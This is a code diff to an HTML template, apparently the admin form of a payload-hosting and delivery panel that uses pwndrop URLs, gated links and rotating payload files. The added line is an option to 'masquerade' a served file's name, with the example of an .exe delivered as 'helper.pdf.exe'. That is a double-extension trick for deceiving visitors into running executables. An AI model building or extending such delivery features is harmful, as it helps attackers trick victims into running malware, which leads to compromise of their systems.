@@ -59,6 +59,7 @@
       <legend>CONTENT</legend>
       <label data-show-when="kind:key"><span>KEY TEXT (kind = key) {% tip "The exact text served when the gate passes. Watermarking appends a per-release marker so leaks trace back." %}</span><textarea class="field-input mono" name="key_text" rows="4">{{ link.key_text }}</textarea></label>
       <label data-show-when="kind:proxy"><span>PWNDROP SOURCE URL (kind = proxy - fetched server-side, location never exposed)</span><input class="field-input mono" name="pwndrop_url" value="{{ link.pwndrop_url }}" placeholder="http://10.0.0.5:8080/files/payload.bin"></label>
+      <label data-show-when="kind:file|proxy"><span>SERVE AS FILENAME (optional) {% tip "Masquerade the download name: the stored file keeps its real name, the visitor downloads it under this one - e.g. fwfafs.exe becomes helper.pdf.exe. Empty = real name." %}</span><input class="field-input mono" name="serve_as" maxlength="200" value="{{ link.serve_as }}" placeholder="helper.pdf.exe"></label>
       <label data-show-when="kind:file"><span>PAYLOAD FILE (kind = file) {% tip "Drop or pick the file to serve. Replacing it later keeps the same URL - rotate payloads without re-sending links." %}</span>
         <div class="drop-zone" data-file-input="payload-input">Drop a file here, or click to choose<input class="field-input" type="file" name="payload" id="payload-input" style="display:none"></div>
         <small class="mono muted" id="payload-input-chosen" style="font-size:.68rem">{% if link.payload %}current: {{ link.payload.name }}{% endif %}</small>
